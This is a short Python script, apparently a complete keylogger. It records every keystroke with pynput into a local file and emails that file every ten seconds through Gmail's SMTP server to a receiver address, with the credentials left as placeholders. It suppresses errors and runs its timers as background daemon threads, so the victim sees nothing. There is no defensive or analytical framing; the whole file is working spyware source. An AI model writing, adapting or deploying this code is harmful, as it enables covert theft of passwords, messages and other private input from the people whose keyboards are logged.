#!/usr/bin/env python
from pynput import keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

log_file = "key_log.txt"
email_timer = None  # Timer for sending emails
log_timer = None  # Timer for log rotation

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "#"
EMAIL_PASSWORD = "#"
RECEIVER_EMAIL = "#"


def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(key)


def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            write_to_file(f' [{key}] ')
    except Exception:
        pass


def send_email():
    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Keylogger Logs"

        # Attach the log file
        with open(log_file, "rb") as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{log_file}"')
        msg.attach(part)

        # Connect to the SMTP server and send the email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()


    except Exception as e:
        pass


def schedule_email():
    global email_timer
    send_email()
    email_timer = threading.Timer(10, schedule_email)  # Schedule every 60 seconds
    email_timer.daemon = True  # Run in background
    email_timer.start()


try:
    # Start periodic email sending
    email_timer = threading.Timer(10, schedule_email)
    email_timer.daemon = True
    email_timer.start()

    # Start the key listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    if email_timer:
        email_timer.cancel()
